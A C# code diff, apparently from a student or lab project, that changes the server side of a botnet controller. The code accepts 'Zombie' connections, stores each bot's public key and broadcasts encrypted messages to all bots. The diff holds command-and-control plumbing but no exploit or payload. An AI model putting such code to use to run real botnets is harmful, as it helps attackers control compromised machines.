@@ -144,7 +144,7 @@ namespace BotnetAPP.Network
 
         private string GetIncomingMessage(Socket s)
         {
-            byte[] rawMessage = new byte[1024];
+            byte[] rawMessage = new byte[8192];
             string resultat = "";
             int k = s.Receive(rawMessage);
             for (int i = 0; i < k; i++)
@@ -168,10 +168,8 @@ namespace BotnetAPP.Network
             foreach (KeyValuePair<Zombie, Socket> item in bot)
             {
 
-                if ( message != "" ) {
-                    _encryption.Encrypt(message) ; 
-                }
-                WriteNetMessage(message, item.Value);
+                // On encrypte avec la clé publique du client 
+                WriteNetMessage(_encryption.Encrypt(message, item.Key), item.Value);
             }
         }
 
@@ -298,7 +296,14 @@ namespace BotnetAPP.Network
                 Console.WriteLine("On attend la connexion.....");
 
                 Socket s = listen.AcceptSocket() ;
-                  s.ReceiveTimeout = 1000 ; 
+
+                /*
+                Un timeout trop gros pourrait poser problème dans la mesure 
+                ou l'envoie d'un message prend plus de 5 secondes
+
+                Dans un environnement local ça pose pas de problème 
+                */
+                  s.ReceiveTimeout = 100000 ; 
 
                 try
                 {
@@ -306,14 +311,12 @@ namespace BotnetAPP.Network
 
 
 
-                    // On récupère la clé publique 
-                    _encryption.SetPublicKey(GetIncomingMessage(s)) ;
+                    // On récupère la clé publique
 
-
-
-                        Zombie nvZb = new(s.RemoteEndPoint.ToString());
-                        _bot.Add(nvZb, s);
-                        OnNewConnectedBot(nvZb);
+                
+                    Zombie nvZb = new(s.RemoteEndPoint.ToString(), GetIncomingMessage(s));
+                    _bot.Add(nvZb, s);
+                    OnNewConnectedBot(nvZb);
 
                         
                     
@@ -329,8 +332,8 @@ namespace BotnetAPP.Network
                 catch (Exception ex)
                 {
                     // DEBUGGING 
-
-                    Console.WriteLine("[EXCEPTION] : " + ex.StackTrace);
+                    Console.WriteLine("[Exception] : " + ex.Message) ; 
+                    Console.WriteLine("[Trace] : " + ex.StackTrace);
                 }
 
                 Thread.Sleep(1000);
